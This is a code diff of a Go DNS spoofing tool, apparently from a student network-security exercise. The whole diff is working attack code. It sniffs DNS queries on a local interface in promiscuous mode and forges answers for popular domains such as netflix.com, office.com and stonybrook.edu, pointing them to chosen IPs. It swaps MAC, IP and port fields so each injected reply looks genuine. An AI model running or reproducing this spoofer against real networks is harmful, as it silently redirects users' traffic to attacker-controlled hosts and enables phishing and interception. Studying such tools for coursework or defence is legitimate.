@@ -2,268 +2,203 @@ package main
 
 import (
 	"fmt"
-	"log"
-	"net"
-	"time"
-	"regexp"
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
+	"log"
+	"net"
+	"regexp"
 )
 
 var (
-	device    string = "enp0s3"
-	snaplen   int32  = 65535
-	promisc   bool   = true
+	device    string = "enp0s3"	
 	err       error
-	timeout   time.Duration = pcap.BlockForever
 	handle    *pcap.Handle
-	hostnames map[string]string
+	hostNames map[string]string
 )
-
-var (
-	es_index   string
-	es_docType string
-	es_server  string
-	InetAddr   string
-)
-
-type DnsMsg struct {
-	Timestamp       string
-	SourceIP        string
-	DestinationIP   string
-	DnsQuery        string
-	DnsAnswer       []string
-	DnsAnswerTTL    []string
-	NumberOfAnswers string
-	DnsResponseCode string
-	DnsOpCode       string
-}
 
 func populateHostName() {
-	hostnames = make(map[string]string)
-	hostnames["imdb.com"] = "192.168.100.4"
-	hostnames["blackboard.com"] = "10.0.0.1"
-	hostnames["spotify.org"] = "10.12.33.1"
-	hostnames["whatsapp.com"] = "10.3.2.1"
-	hostnames["stonybrook.edu"] = "10.3.2.2"
-	hostnames["office.com"] = "10.3.2.3"
-	hostnames["netflix.com"] = "10.3.2.4"
-	hostnames["spotify.com"] = "10.3.2.5"
-	hostnames["myshopify.com"] = "10.3.2.6"
-	hostnames["wikipedia.org"] = "10.3.2.7"
+	hostNames = make(map[string]string)
+	hostNames["imdb.com"] = "192.168.100.4"
+	hostNames["blackboard.com"] = "10.0.0.1"
+	hostNames["spotify.org"] = "10.12.33.1"
+	hostNames["whatsapp.com"] = "10.3.2.1"
+	hostNames["stonybrook.edu"] = "10.3.2.2"
+	hostNames["office.com"] = "10.3.2.3"
+	hostNames["netflix.com"] = "10.3.2.4"
+	hostNames["spotify.com"] = "10.3.2.5"
+	hostNames["myshopify.com"] = "10.3.2.6"
+	hostNames["wikipedia.org"] = "10.3.2.7"
 }
 
 func getSpoofedIP(s string) (string, bool) {
-	for key, value := range hostnames {
-		matched, _ := regexp.MatchString(key, s)
-		fmt.Println(key, "-> ", value, s)
-		if matched {
+	for key, value := range hostNames {
+		found, _ := regexp.MatchString(key, s)
+		if found {
 			return value, true
 		}
 	}
-
 	return "", false
 }
 
-func getIFaceIP(ifacename string) net.IP {
-
-	// get the list of interfaces
-	ifaces, err := net.Interfaces()
+func getInterfaceIP(interfaceName string) net.IP {
+	interfaces, err := net.Interfaces()
 	if err != nil {
+		fmt.Println("Error encountered during get Interfaces list:", err)
 		panic(err)
 	}
 
-	// loop through them to get our local address
-	for i := range ifaces {
+	for i := range interfaces {
+		if interfaces[i].Name == interfaceName {
+			addrs, err := interfaces[i].Addrs()
+			if err != nil {
+				fmt.Println("Error encountered during interface address reading:", err)
+				panic(err)
+			}
 
-		// check it's the interface we want
-		if ifaces[i].Name != ifacename {
-			continue
-		}
+			if len(addrs) < 1 {
+				panic("No address on the given interface")
+			}
 
-		// get the addresses
-		addrs, err := ifaces[i].Addrs()
-		if err != nil {
-			panic(err)
-		}
-
-		// check to ensure there is an address on this interface
-		if len(addrs) < 1 {
-			panic("No address on target interface")
-		}
-
-		// use the first available address
-		ip, _, err := net.ParseCIDR(addrs[0].String())
-		if err != nil {
-			panic(err)
-		}
-
-		return ip
-
+			ip, _, err := net.ParseCIDR(addrs[0].String())
+			if err != nil {
+				fmt.Println("Error encountered during parseCIDR:", err)
+				panic(err)
+			}
+			return ip
+		} else {
+			continue;
+		}		
 	}
 	return nil
 }
 
-func processPackets(isHostFile bool) {
-
+func processDNSPackets() {
+	var dnsLayer layers.DNS
 	var ethLayer layers.Ethernet
 	var ipv4Layer layers.IPv4
 	var ipv6Layer layers.IPv6
+	var payload gopacket.Payload
 	var tcpLayer layers.TCP
 	var udpLayer layers.UDP
-	var dnsLayer layers.DNS
-
-	var payload gopacket.Payload
+	
 	var qDNS layers.DNSQuestion
-	var aDNS layers.DNSResourceRecord
+	var rrDNS layers.DNSResourceRecord
 
-	outbuf := gopacket.NewSerializeBuffer()
+	var ethMac net.HardwareAddr
+	var i uint16
+	var ipv4Addr net.IP
+	var ipv6Addr net.IP
+	var isFound bool
+	var udpPort layers.UDPPort
+	var spoofedIP string
 
-	serialOpts := gopacket.SerializeOptions{
+	outputBuffer := gopacket.NewSerializeBuffer()
+	serialOptions := gopacket.SerializeOptions{
 		FixLengths:       true,
 		ComputeChecksums: true,
 	}
-
-	// pre-allocate loop counter
-	var i uint16
-
-	// swap storage for ip and udp fields
-	var ipv4Addr net.IP
-	var udpPort layers.UDPPort
-	var ethMac net.HardwareAddr
-
-	var isMatched bool
-	var spoofedIP string
+	
 
 	parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipv4Layer, &ipv6Layer, &tcpLayer, &udpLayer, &dnsLayer, &payload)
 
 	decodedLayers := make([]gopacket.LayerType, 0, 10)
 
 	for true {
-
-		aDNS.Type = layers.DNSTypeA
-		aDNS.Class = layers.DNSClassIN
-		aDNS.TTL = 300
-		aDNS.IP = getIFaceIP(device)
-
+		rrDNS.Type = layers.DNSTypeA
+		rrDNS.Class = layers.DNSClassIN
+		rrDNS.TTL = 300
+		rrDNS.IP = getInterfaceIP(device)
 		data, _, err := handle.ZeroCopyReadPacketData()
 		if err != nil {
 			fmt.Println("Error reading packet data: ", err)
 			continue
 		}
-		// fmt.Println(ip4.SrcIP.String())
 		err = parser.DecodeLayers(data, &decodedLayers)
-		// only proceed if all layers decoded
 		if len(decodedLayers) != 4 {
 			fmt.Println("Not enough layers!")
 			continue
 		}
-
-		// check that this is not a response
 		if dnsLayer.QR {
 			continue
 		}
 
 		for _, typ := range decodedLayers {
 			switch typ {
-			case layers.LayerTypeIPv4:
-				// swap the ip
-				ipv4Addr = ipv4Layer.SrcIP
-				ipv4Layer.SrcIP = ipv4Layer.DstIP
-				ipv4Layer.DstIP = ipv4Addr
+				case layers.LayerTypeEthernet:
+					// swap ethernet macs
+					ethMac = ethLayer.SrcMAC
+					ethLayer.SrcMAC = ethLayer.DstMAC
+					ethLayer.DstMAC = ethMac
 
-			case layers.LayerTypeIPv6:
-				// swap the ip
-				ipv4Addr = ipv6Layer.SrcIP
-				ipv6Layer.SrcIP = ipv6Layer.DstIP
-				ipv6Layer.DstIP = ipv4Addr
+				case layers.LayerTypeIPv4:
+					// swap the ip
+					ipv4Addr = ipv4Layer.SrcIP
+					ipv4Layer.SrcIP = ipv4Layer.DstIP
+					ipv4Layer.DstIP = ipv4Addr
 
-			case layers.LayerTypeUDP:
-				// swap the udp ports
-				udpPort = udpLayer.SrcPort
-				udpLayer.SrcPort = udpLayer.DstPort
-				udpLayer.DstPort = udpPort
+				case layers.LayerTypeIPv6:
+					// swap the ip
+					ipv6Addr = ipv6Layer.SrcIP
+					ipv6Layer.SrcIP = ipv6Layer.DstIP
+					ipv6Layer.DstIP = ipv6Addr
 
-			case layers.LayerTypeEthernet:
-				// swap ethernet macs
-				ethMac = ethLayer.SrcMAC
-				ethLayer.SrcMAC = ethLayer.DstMAC
-				ethLayer.DstMAC = ethMac
+				case layers.LayerTypeUDP:
+					// swap the udp ports
+					udpPort = udpLayer.SrcPort
+					udpLayer.SrcPort = udpLayer.DstPort
+					udpLayer.DstPort = udpPort
 
-			case layers.LayerTypeDNS:
-				// set this to be a response
-				dnsLayer.QR = true
+				case layers.LayerTypeDNS:
+					dnsLayer.QR = true
 
-				// if recursion was requested, it is available
-				if dnsLayer.RD {
-					dnsLayer.RA = true
-				}
-
-				// for each question
-				for i = 0; i < dnsLayer.QDCount; i++ {
-
-					// get the question
-					qDNS = dnsLayer.Questions[i]
-
-					// verify this is an A-IN record question
-					if qDNS.Type != layers.DNSTypeA || qDNS.Class != layers.DNSClassIN {
-						continue
+					if dnsLayer.RD {
+						dnsLayer.RA = true
 					}
 
-					// copy the name across to the response
-					aDNS.Name = qDNS.Name
-					// fmt.Println("NAME: ", string(qDNS.Name))
+					for i = 0; i < dnsLayer.QDCount; i++ {
+						qDNS = dnsLayer.Questions[i]
 
-					// spoofedIP, isMatched = hostnames[string(qDNS.Name)]
+						// verify this is a valid record question
+						if qDNS.Type != layers.DNSTypeA || qDNS.Class != layers.DNSClassIN {
+							continue
+						}
 
-					// isMatched = true
-					// spoofedIP = getIFaceIP(device).String()
+						rrDNS.Name = qDNS.Name
+						spoofedIP, isFound = getSpoofedIP(string(qDNS.Name))
+						rrDNS.IP = net.ParseIP(spoofedIP)
 
-					// if isHostFile {
-						spoofedIP, isMatched = getSpoofedIP(string(qDNS.Name))
-						fmt.Println(spoofedIP)
-						aDNS.IP = net.ParseIP(spoofedIP)
-					// }
+						if isFound {
+							fmt.Println("\nNAME: ", string(qDNS.Name))
+							fmt.Println("Spoofed IP: ", spoofedIP)
+						}
+						rrDNS.Name = qDNS.Name
 
-					if isMatched {
-						fmt.Println("\nNAME: ", string(qDNS.Name))
-						fmt.Println("Spoofed IP: ", spoofedIP)
+						dnsLayer.Answers = append(dnsLayer.Answers, rrDNS)
+						dnsLayer.ANCount++
 					}
-					// copy the name across to the response
-					aDNS.Name = qDNS.Name
-
-					// append the answer to the original query packet
-					dnsLayer.Answers = append(dnsLayer.Answers, aDNS)
-					dnsLayer.ANCount = dnsLayer.ANCount + 1
-				}
-
 			}
 		}
-		if isMatched {
-			// set the UDP to be checksummed by the IP layer
+		if isFound {
 			err = udpLayer.SetNetworkLayerForChecksum(&ipv4Layer)
 			if err != nil {
 				panic(err)
+				fmt.Println("Error encountered during SetNetworkLayerForChecksum:", err)
 			}
 
-			// serialize packets
-			err = gopacket.SerializeLayers(outbuf, serialOpts, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)
+			err = gopacket.SerializeLayers(outputBuffer, serialOptions, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)
 			if err != nil {
 				panic(err)
+				fmt.Println("Error encountered during SerializeLayers:", err)
 			}
 
-			// write packet
-			err = handle.WritePacketData(outbuf.Bytes())
+			err = handle.WritePacketData(outputBuffer.Bytes())
 			if err != nil {
 				panic(err)
+				fmt.Println("Error encountered during WritePacketData:", err)
 			}
 
 			fmt.Println("Response sent")
-
-			if err != nil {
-				fmt.Println("  Error encountered:", err)
-			}
 		}
 	}
 }
@@ -278,17 +213,24 @@ func main() {
 
 	var filter string = "udp port 53"
 
-	handle, err = pcap.OpenLive(device, snaplen, promisc, timeout)
+	handle, err = pcap.OpenLive(device, 65535, true, pcap.BlockForever)
+
+	if err != nil {
+		panic(err)
+		fmt.Println("Error encountered during pcap.OpenLive:", err)
+	}
+
 	fmt.Println(filter)
 	log.Printf("Listening on default \"%s\" interface\n", device)
 
-	if err != nil {
-		log.Fatal(err)
-	}
 	defer handle.Close()
 
-	fmt.Println("Filter: ", filter)
 	err = handle.SetBPFFilter(filter)
 
-	processPackets(true)
+	if err != nil {
+		panic(err)
+		fmt.Println("Error encountered during SetBPFFilter:", err)
+	}
+
+	processDNSPackets()
 }
